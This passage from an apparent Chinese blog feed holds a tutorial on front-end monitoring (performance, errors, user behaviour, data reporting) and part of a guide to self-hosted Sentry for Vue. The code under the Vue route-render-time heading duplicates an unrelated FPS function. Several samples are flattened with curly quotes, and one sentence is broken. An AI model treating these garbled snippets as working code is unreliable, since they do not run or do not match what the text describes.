class="keyword">let</span> i = <span class="number">0</span>; i &lt; fpsList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fpsList[i] &amp;&amp; fpsList[i] &lt; below) &#123;</span><br><span class="line">      count++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt;= last) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="jUyEi"></a></p><h3 id="Vue-路由变更渲染时间"><a href="#Vue-路由变更渲染时间" class="headerlink" title="Vue 路由变更渲染时间"></a>Vue 路由变更渲染时间</h3><p>首屏渲染时间我们已经知道如何计算了，但是如何计算 SPA 应用的页面路由切换导致的页面渲染时间呢？本文用 Vue 作为示例，讲一下我的思路。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isBlocking</span>(<span class="params">fpsList, below = <span class="number">20</span>, last = <span class="number">3</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; fpsList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fpsList[i] &amp;&amp; fpsList[i] &lt; below) &#123;</span><br><span class="line">      count++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt;= last) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑如下：</p><ol><li>监听路由钩子，在路由切换时会触发 router.beforeEach() 钩子，在该钩子的回调函数里将当前时间记为渲染开始时间。</li><li>利用 Vue.mixin() 对所有组件的 mounted() 注入一个函数。每个函数都执行一个防抖函数。</li><li>当最后一个组件的 mounted() 触发时，就代表该路由下的所有组件已经挂载完毕。可以在 this.$nextTick() 回调函数中获取渲染时间。</li></ol><p>同时，还要考虑到一个情况。不切换路由时，也会有变更组件的情况，这时不应该在这些组件的 mounted() 里进行渲染时间计算。所以需要添加一个 needCalculateRenderTime 字段，当切换路由时将它设为 true，代表可以计算渲染时间了。<br><a name="LvkSc"></a></p><h2 id="错误数据采集"><a href="#错误数据采集" class="headerlink" title="错误数据采集"></a>错误数据采集</h2><p><a name="tdu3q"></a></p><h3 id="资源加载错误"><a href="#资源加载错误" class="headerlink" title="资源加载错误"></a>资源加载错误</h3><p>使用 addEventListener() 监听 error 事件，可以捕获到资源加载失败错误。<br />&#x2F;&#x2F; 捕获资源加载失败错误 js css img… window.addEventListener(‘error’, e &#x3D;&gt; { const target &#x3D; e.target if (!target) return if (target.src || target.href) { const url &#x3D; target.src || target.href lazyReportCache({ url, type: ‘error’, subType: ‘resource’, startTime: e.timeStamp, html: target.outerHTML, resourceType: target.tagName, paths: e.path.map(item &#x3D;&gt; item.tagName).filter(Boolean), pageURL: getPageURL(), }) } }, true) 复制代码<br><a name="yfrCH"></a></p><h3 id="js-错误"><a href="#js-错误" class="headerlink" title="js 错误"></a>js 错误</h3><p>使用 window.onerror 可以监听 js 错误。<br />&#x2F;&#x2F; 监听 js 错误 window.onerror &#x3D; (msg, url, line, column, error) &#x3D;&gt; { lazyReportCache({ msg, line, column, error: error.stack, subType: ‘js’, pageURL: url, type: ‘error’, startTime: performance.now(), }) } 复制代码<br><a name="YQnRt"></a></p><h3 id="promise-错误"><a href="#promise-错误" class="headerlink" title="promise 错误"></a>promise 错误</h3><p>使用 addEventListener() 监听 unhandledrejection 事件，可以捕获到未处理的 promise 错误。<br />&#x2F;&#x2F; 监听 promise 错误 缺点是获取不到列数据 window.addEventListener(‘unhandledrejection’, e &#x3D;&gt; { lazyReportCache({ reason: e.reason?.stack, subType: ‘promise’, type: ‘error’, startTime: e.timeStamp, pageURL: getPageURL(), }) }) 复制代码<br><a name="AlrmF"></a></p><h3 id="sourcemap"><a href="#sourcemap" class="headerlink" title="sourcemap"></a>sourcemap</h3><p>一般生产环境的代码都是经过压缩的，并且生产环境不会把 sourcemap 文件上传。所以生产环境上的代码报错信息是很难读的。因此，我们可以利用 <a href="https://link.juejin.cn/?target=https://github.com/mozilla/source-map">source-map</a> 来对这些压缩过的代码报错信息进行还原。<br />当代码报错时，我们可以获取到对应的文件名、行数、列数:<br />{ line: 1, column: 17, file: ‘https:&#x2F;<a href="http://www.xxx.com/bundlejs">www.xxx.com/bundlejs</a>‘, } 复制代码<br />然后调用下面的代码进行还原：<br />async function parse(error) { const mapObj &#x3D; JSON.parse(getMapFileContent(error.url)) const consumer &#x3D; await new sourceMap.SourceMapConsumer(mapObj) &#x2F;&#x2F; 将 webpack:&#x2F;&#x2F;source-map-demo&#x2F;.&#x2F;src&#x2F;index.js 文件中的 .&#x2F; 去掉 const sources &#x3D; mapObj.sources.map(item &#x3D;&gt; format(item)) &#x2F;&#x2F; 根据压缩后的报错信息得出未压缩前的报错行列数和源码文件 const originalInfo &#x3D; consumer.originalPositionFor({ line: error.line, column: error.column }) &#x2F;&#x2F; sourcesContent 中包含了各个文件的未压缩前的源码，根据文件名找出对应的源码 const originalFileContent &#x3D; mapObj.sourcesContent[sources.indexOf(originalInfo.source)] return { file: originalInfo.source, content: originalFileContent, line: originalInfo.line, column: originalInfo.column, msg: error.msg, error: error.error } } function format(item) { return item.replace(&#x2F;(./)*&#x2F;g, ‘’) } function getMapFileContent(url) { return fs.readFileSync(path.resolve(__dirname, <code>./maps/$&#123;url.split(&#39;/&#39;).pop()&#125;.map</code>), ‘utf-8’) } 复制代码<br />每次项目打包时，如果开启了 sourcemap，那么每一个 js 文件都会有一个对应的 map 文件。<br />bundle.js bundle.js.map 复制代码<br />这时 js 文件放在静态服务器上供用户访问，map 文件存储在服务器，用于还原错误信息。source-map 库可以根据压缩过的代码报错信息还原出未压缩前的代码报错信息。例如压缩后报错位置为 1 行 47 列，还原后真正的位置可能为 4 行 10 列。除了位置信息，还可以获取到源码原文。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217143143-8d961072-2087-4a38-b8d0-c1462785f5f0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/300943/1675217143143-8d961072-2087-4a38-b8d0-c1462785f5f0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"> 来做这个事，有兴趣可以看看。<br><a name="mMKsQ"></a></p><h3 id="Vue-错误"><a href="#Vue-错误" class="headerlink" title="Vue 错误"></a>Vue 错误</h3><p>利用 window.onerror 是捕获不到 Vue 错误的，它需要使用 Vue 提供的 API 进行监听。<br />Vue.config.errorHandler &#x3D; (err, vm, info) &#x3D;&gt; { &#x2F;&#x2F; 将报错信息打印到控制台 console.error(err) lazyReportCache({ info, error: err.stack, subType: ‘vue’, type: ‘error’, startTime: performance.now(), pageURL: getPageURL(), }) } 复制代码<br><a name="DdVpm"></a></p><h2 id="行为数据采集"><a href="#行为数据采集" class="headerlink" title="行为数据采集"></a>行为数据采集</h2><p><a name="znw8q"></a></p><h3 id="PV、UV"><a href="#PV、UV" class="headerlink" title="PV、UV"></a>PV、UV</h3><p>PV(page view) 是页面浏览量，UV(Unique visitor)用户访问量。PV 只要访问一次页面就算一次，UV 同一天内多次访问只算一次。<br />对于前端来说，只要每次进入页面上报一次 PV 就行，UV 的统计放在服务端来做，主要是分析上报的数据来统计得出 UV。<br />export default function pv() { lazyReportCache({ type: ‘behavior’, subType: ‘pv’, startTime: performance.now(), pageURL: getPageURL(), referrer: document.referrer, uuid: getUUID(), }) } 复制代码<br><a name="XrC5N"></a></p><h3 id="页面停留时长"><a href="#页面停留时长" class="headerlink" title="页面停留时长"></a>页面停留时长</h3><p>用户进入页面记录一个初始时间，用户离开页面时用当前时间减去初始时间，就是用户停留时长。这个计算逻辑可以放在 beforeunload 事件里做。<br />export default function pageAccessDuration() { onBeforeunload(() &#x3D;&gt; { report({ type: ‘behavior’, subType: ‘page-access-duration’, startTime: performance.now(), pageURL: getPageURL(), uuid: getUUID(), }, true) }) } 复制代码<br><a name="VASmF"></a></p><h3 id="页面访问深度"><a href="#页面访问深度" class="headerlink" title="页面访问深度"></a>页面访问深度</h3><p>记录页面访问深度是很有用的，例如不同的活动页面 a 和 b。a 平均访问深度只有 50%，b 平均访问深度有 80%，说明 b 更受用户喜欢，根据这一点可以有针对性的修改 a 活动页面。<br />除此之外还可以利用访问深度以及停留时长来鉴别电商刷单。例如有人进来页面后一下就把页面拉到底部然后等待一段时间后购买，有人是慢慢的往下滚动页面，最后再购买。虽然他们在页面的停留时间一样，但明显第一个人更像是刷单的。<br />页面访问深度计算过程稍微复杂一点：</p><ol><li>用户进入页面时，记录当前时间、scrollTop 值、页面可视高度、页面总高度。</li><li>用户滚动页面的那一刻，会触发 scroll 事件，在回调函数中用第一点得到的数据算出页面访问深度和停留时长。</li><li>当用户滚动页面到某一点时，停下继续观看页面。这时记录当前时间、scrollTop 值、页面可视高度、页面总高度。</li><li>重复第二点…</li></ol><p>具体代码请看：<br />let timer let startTime &#x3D; 0 let hasReport &#x3D; false let pageHeight &#x3D; 0 let scrollTop &#x3D; 0 let viewportHeight &#x3D; 0 export default function pageAccessHeight() { window.addEventListener(‘scroll’, onScroll) onBeforeunload(() &#x3D;&gt; { const now &#x3D; performance.now() report({ startTime: now, duration: now - startTime, type: ‘behavior’, subType: ‘page-access-height’, pageURL: getPageURL(), value: toPercent((scrollTop + viewportHeight) &#x2F; pageHeight), uuid: getUUID(), }, true) }) &#x2F;&#x2F; 页面加载完成后初始化记录当前访问高度、时间 executeAfterLoad(() &#x3D;&gt; { startTime &#x3D; performance.now() pageHeight &#x3D; document.documentElement.scrollHeight || document.body.scrollHeight scrollTop &#x3D; document.documentElement.scrollTop || document.body.scrollTop viewportHeight &#x3D; window.innerHeight }) } function onScroll() { clearTimeout(timer) const now &#x3D; performance.now() if (!hasReport) { hasReport &#x3D; true lazyReportCache({ startTime: now, duration: now - startTime, type: ‘behavior’, subType: ‘page-access-height’, pageURL: getPageURL(), value: toPercent((scrollTop + viewportHeight) &#x2F; pageHeight), uuid: getUUID(), }) } timer &#x3D; setTimeout(() &#x3D;&gt; { hasReport &#x3D; false startTime &#x3D; now pageHeight &#x3D; document.documentElement.scrollHeight || document.body.scrollHeight scrollTop &#x3D; document.documentElement.scrollTop || document.body.scrollTop viewportHeight &#x3D; window.innerHeight }, 500) } function toPercent(val) { if (val &gt;&#x3D; 1) return ‘100%’ return (val * 100).toFixed(2) + ‘%’ } 复制代码<br><a name="Y4y4I"></a></p><h3 id="用户点击"><a href="#用户点击" class="headerlink" title="用户点击"></a>用户点击</h3><p>利用 addEventListener() 监听 mousedown、touchstart 事件，我们可以收集用户每一次点击区域的大小，点击坐标在整个页面中的具体位置，点击元素的内容等信息。<br />export default function onClick() { [‘mousedown’, ‘touchstart’].forEach(eventType &#x3D;&gt; { let timer window.addEventListener(eventType, event &#x3D;&gt; { clearTimeout(timer) timer &#x3D; setTimeout(() &#x3D;&gt; { const target &#x3D; event.target const { top, left } &#x3D; target.getBoundingClientRect() lazyReportCache({ top, left, eventType, pageHeight: document.documentElement.scrollHeight || document.body.scrollHeight, scrollTop: document.documentElement.scrollTop || document.body.scrollTop, type: ‘behavior’, subType: ‘click’, target: target.tagName, paths: event.path?.map(item &#x3D;&gt; item.tagName).filter(Boolean), startTime: event.timeStamp, pageURL: getPageURL(), outerHTML: target.outerHTML, innerHTML: target.innerHTML, width: target.offsetWidth, height: target.offsetHeight, viewport: { width: window.innerWidth, height: window.innerHeight, }, uuid: getUUID(), }) }, 500) }) }) } 复制代码<br><a name="DSIXl"></a></p><h3 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h3><p>利用 addEventListener() 监听 popstate、hashchange 页面跳转事件。需要注意的是调用 history.pushState()或 history.replaceState()不会触发 popstate 事件。只有在做出浏览器动作时，才会触发该事件，如用户点击浏览器的回退按钮（或者在 Javascript 代码中调用 history.back()或者 history.forward()方法）。同理，hashchange 也一样。<br />export default function pageChange() { let from &#x3D; ‘’ window.addEventListener(‘popstate’, () &#x3D;&gt; { const to &#x3D; getPageURL() lazyReportCache({ from, to, type: ‘behavior’, subType: ‘popstate’, startTime: performance.now(), uuid: getUUID(), }) from &#x3D; to }, true) let oldURL &#x3D; ‘’ window.addEventListener(‘hashchange’, event &#x3D;&gt; { const newURL &#x3D; event.newURL lazyReportCache({ from: oldURL, to: newURL, type: ‘behavior’, subType: ‘hashchange’, startTime: performance.now(), uuid: getUUID(), }) oldURL &#x3D; newURL }, true) } 复制代码<br><a name="wGJ7S"></a></p><h3 id="Vue-路由变更"><a href="#Vue-路由变更" class="headerlink" title="Vue 路由变更"></a>Vue 路由变更</h3><p>Vue 可以利用 router.beforeEach 钩子进行路由变更的监听。<br />export default function onVueRouter(router) { router.beforeEach((to, from, next) &#x3D;&gt; { &#x2F;&#x2F; 首次加载页面不用统计 if (!from.name) { return next() } const data &#x3D; { params: to.params, query: to.query, } lazyReportCache({ data, name: to.name || to.path, type: ‘behavior’, subType: [‘vue-router-change’, ‘pv’], startTime: performance.now(), from: from.fullPath, to: to.fullPath, uuid: getUUID(), }) next() }) } 复制代码<br><a name="FETNa"></a></p><h2 id="数据上报"><a href="#数据上报" class="headerlink" title="数据上报"></a>数据上报</h2><p><a name="oHjKH"></a></p><h3 id="上报方法"><a href="#上报方法" class="headerlink" title="上报方法"></a>上报方法</h3><p>数据上报可以使用以下几种方式：</p><ul><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon">sendBeacon</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a></li><li>image</li></ul><p>我写的简易 SDK 采用的是第一、第二种方式相结合的方式进行上报。利用 sendBeacon 来进行上报的优势非常明显。<br />使用 <strong>sendBeacon()</strong> 方法会使用户代理在有机会时异步地向服务器发送数据，同时不会延迟页面的卸载或影响下一导航的载入性能。这就解决了提交分析数据时的所有的问题：数据可靠，传输异步并且不会影响下一页面的加载。<br />在不支持 sendBeacon 的浏览器下我们可以使用 XMLHttpRequest 来进行上报。一个 HTTP 请求包含发送和接收两个步骤。其实对于上报来说，我们只要确保能发出去就可以了。也就是发送成功了就行，接不接收响应无所谓。为此，我做了个实验，在 beforeunload 用 XMLHttpRequest 传送了 30kb 的数据（一般的待上报数据很少会有这么大），换了不同的浏览器，都可以成功发出去。当然，这和硬件性能、网络状态也是有关联的。<br><a name="WGbpV"></a></p><h3 id="上报时机"><a href="#上报时机" class="headerlink" title="上报时机"></a>上报时机</h3><p>上报时机有三种：</p><ol><li>采用 requestIdleCallback&#x2F;setTimeout 延时上报。</li><li>在 beforeunload 回调函数里上报。</li><li>缓存上报数据，达到一定数量后再上报。</li></ol><p>建议将三种方式结合一起上报：</p><ol><li>先缓存上报数据，缓存到一定数量后，利用 requestIdleCallback&#x2F;setTimeout 延时上报。</li><li>在页面离开时统一将未上报的数据进行上报。<br><a name="WgsFZ"></a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>仅看理论知识是比较难以理解的，为此我结合本文所讲的技术要点写了一个简单的<a href="https://link.juejin.cn/?target=https://github.com/woai3c/monitor-demo">监控 SDK</a>，可以用它来写一些简单的 DEMO，帮助加深理解。再结合本文一起阅读，效果更好。<br><a name="fQRej"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a name="QE32N"></a></p><h3 id="性能监控"><a href="#性能监控" class="headerlink" title="性能监控"></a>性能监控</h3><ul><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Performance_API">Performance API</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceResourceTiming">PerformanceResourceTiming</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API">Using_the_Resource_Timing_API</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceTiming">PerformanceTiming</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/metrics/">Metrics</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/evolving-cls/">evolving-cls</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/custom-metrics/">custom-metrics</a></li><li><a href="https://link.juejin.cn/?target=https://github.com/GoogleChrome/web-vitals">web-vitals</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/PerformanceObserver">PerformanceObserver</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/API/Element_timing_API">Element_timing_API</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/en-US/docs/Web/API/PerformanceEventTiming">PerformanceEventTiming</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Timing-Allow-Origin">Timing-Allow-Origin</a></li><li><a href="https://link.juejin.cn/?target=https://web.dev/bfcache/">bfcache</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/MutationObserver">MutationObserver</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a></li><li><a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/39292837">如何监控网页的卡顿</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon">sendBeacon</a><br><a name="Xmp2u"></a></li></ul><h3 id="错误监控"><a href="#错误监控" class="headerlink" title="错误监控"></a>错误监控</h3><ul><li><a href="https://link.juejin.cn/?target=https://github.com/joeyguo/noerror">noerror</a></li><li><a href="https://link.juejin.cn/?target=https://github.com/mozilla/source-map">source-map</a><br><a name="MLtN4"></a></li></ul><h3 id="行为监控"><a href="#行为监控" class="headerlink" title="行为监控"></a>行为监控</h3><ul><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Window/popstate_event">popstate</a></li><li><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/API/Window/hashchange_event">hashchange</a></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平台接入sentry自托管项目</title>
      <link href="/2023/06/28/frontend/monitor/ping-tai-jie-ru-sentry-zi-tuo-guan-xiang-mu/"/>
      <url>/2023/06/28/frontend/monitor/ping-tai-jie-ru-sentry-zi-tuo-guan-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="296fdc53"></a></p><h2 id="一、安装-docker"><a href="#一、安装-docker" class="headerlink" title="一、安装 docker"></a>一、安装 docker</h2><p><a name="9c06c99b"></a></p><h3 id="1-Windows-Docker-安装"><a href="#1-Windows-Docker-安装" class="headerlink" title="1.Windows Docker 安装"></a>1.Windows Docker 安装</h3><p><a href="https://www.runoob.com/docker/windows-docker-install.html">https://www.runoob.com/docker/windows-docker-install.html</a><br><a name="afe83730"></a></p><h3 id="2-MacOS-Docker-安装"><a href="#2-MacOS-Docker-安装" class="headerlink" title="2.MacOS Docker 安装"></a>2.MacOS Docker 安装</h3><p><a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p><ul><li>使用 Homebrew 安装</li><li>手动下载安装</li></ul><p>安装好之后，启动终端，通过命令可以检查安装后的 Docker 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker --version</span><br><span class="line">Docker version 17.09.1-ce, build 19e2cf6</span><br></pre></td></tr></table></figure><p>个人建议 Mac 直接手动下载安装，因为 homebrew 当时安装的时候碰到了一系列问题难以解决</p><p><a name="caae1b73"></a></p><h2 id="二、python3-环境安装"><a href="#二、python3-环境安装" class="headerlink" title="二、python3 环境安装"></a>二、python3 环境安装</h2><p><a name="dec6228f"></a></p><h3 id="1-Window-平台安装-Python"><a href="#1-Window-平台安装-Python" class="headerlink" title="1.Window 平台安装 Python"></a>1.Window 平台安装 Python</h3><p>打开 WEB 浏览器访问 <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a> ，一般就下载 executable installer，x86 表示是 32 位机子的，x86-64 表示 64 位机子的。<br><a name="50396c72"></a></p><h3 id="2-MAC-平台安装-Python"><a href="#2-MAC-平台安装-Python" class="headerlink" title="2.MAC 平台安装 Python"></a>2.MAC 平台安装 Python</h3><p>MAC 系统都自带有 Python2.7 环境，你可以在链接 <a href="https://www.python.org/downloads/mac-osx/">https://www.python.org/downloads/mac-osx/</a> 上下载最新版安装 Python 3.x。<br />你也可以参考源码安装的方式来安装。</p><p><a name="ba93fb88"></a></p><h2 id="三、sentry-项目代码下载本地执行"><a href="#三、sentry-项目代码下载本地执行" class="headerlink" title="三、sentry 项目代码下载本地执行"></a>三、sentry 项目代码下载本地执行</h2><p>代码下载地址： <a href="https://github.com/getsentry/self-hosted">https://github.com/getsentry/self-hosted</a></p><p>项目代码打开后执行  .&#x2F;install.sh   指令 （时间较久）</p><p>在安装过程中，会提示您是否要创建用户帐户。如果您要求安装不被提示阻止，请运行<code>./install.sh --skip-user-prompt</code>. （第一次执行建议直接执行 .&#x2F;install.sh   指令 创建自己的账户）</p><p>安装成功后 打开 docker 执行 docker compose up -d 指令 （第一次执行时间较久）</p><p>执行成功后 即可访问 <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000/</a></p><p>访问 <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000/</a> 如果出现这样的登录页面，表明 Sentry 部署完成</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953875614-835762d0-e508-463d-968f-b4649a8d9564.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953875614-835762d0-e508-463d-968f-b4649a8d9564.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="decc689c"></a></p><h2 id="四、vue-项目-sentry-端配置"><a href="#四、vue-项目-sentry-端配置" class="headerlink" title="四、vue 项目 sentry 端配置"></a>四、vue 项目 sentry 端配置</h2><p>Sentry 部署完成之后，需要创建一个项目，这个项目就是对应你的 web 项目，我的项目是 vue 写的，对应语言选择 vue 即可，旁边的 team 表示访问权限组<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953946869-fcbc0328-7c74-4830-acea-19f939428116.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953946869-fcbc0328-7c74-4830-acea-19f939428116.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>获取 API Auth Tokens，这个 token 是将来 vue 项目上报程序异常信息到 Sentry 的通信凭证</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953972812-fdcaa307-d450-41be-9c6c-d94f60e7b43a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/25400311/1659953972812-fdcaa307-d450-41be-9c6c-d94f60e7b43a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="32072f83"></a></p><h2 id="五、本地项目接入-sentry"><a href="#五、本地项目接入-sentry" class="headerlink" title="五、本地项目接入 sentry"></a>五、本地项目接入 sentry</h2><ul><li><code>@sentry/vue</code> (Sentry’s Vue SDK)</li><li><code>@sentry/tracing</code> (instruments performance data)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Using yarn</span><br><span class="line">yarn add @sentry/vue @sentry/tracing</span><br><span class="line"></span><br><span class="line"># Using npm</span><br><span class="line">npm install --save @sentry/vue @sentry/tracing</span><br></pre></td></tr></table></figure><p><a name="Vue2"></a></p><h3 id="Vue2"><a href="#Vue2" class="headerlink" title="Vue2"></a>Vue2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &quot;vue&quot;;</span><br><span class="line">import Router from &quot;vue-router&quot;;</span><br><span class="line">import * as Sentry from &quot;@sentry/vue&quot;;</span><br><span class="line">import &#123; BrowserTracing &#125; from &quot;@sentry/tracing&quot;;</span><br><span class="line"></span><br><span class="line">Vue.use(Router);</span><br><span class="line"></span><br><span class="line">const router = new Router(&#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Sentry.init(&#123;</span><br><span class="line">  Vue,</span><br><span class="line">  dsn: &quot;https://b1fe70b553f84880bad94839a0acd387@o1280003.ingest.sentry.io/6487277&quot;,</span><br><span class="line">  integrations: [</span><br><span class="line">    new BrowserTracing(&#123;</span><br><span class="line">      routingInstrumentation: Sentry.vueRouterInstrumentation(router),</span><br><span class="line">      tracingOrigins: [&quot;localhost&quot;, &quot;my-site-url.com&quot;, /^\//],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  // Set tracesSampleRate to 1.0 to capture 100%</span><br><span class="line">  // of transactions for performance monitoring.</span><br><span class="line">  // We recommend adjusting this value in production</span><br><span class="line">  tracesSampleRate: 1.0,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">&#125;).$mount(&quot;#app&quot;);</span><br></pre></td></tr></table></figure><p><a name="Vue3"></a></p><h3 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 